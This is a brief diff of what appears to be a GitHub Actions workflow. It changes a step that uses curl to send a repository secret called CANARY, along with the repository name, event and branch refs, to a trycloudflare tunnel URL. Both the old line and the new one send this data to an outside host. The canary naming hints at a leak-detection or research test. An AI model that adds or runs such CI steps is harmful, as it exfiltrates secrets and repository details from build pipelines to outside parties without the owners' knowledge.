@@ -11,4 +11,4 @@ jobs:
         env:
           CANARY: ${{ secrets.CANARY }}
         run: |
-          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-q2-leak?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&ref=${{ github.ref }}&head=${{ github.head_ref }}"
+          curl -sS "https://host-pillow-auditor-allowed.trycloudflare.com/0x19-q2-command?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&ref=${{ github.ref }}&head=${{ github.head_ref }}"
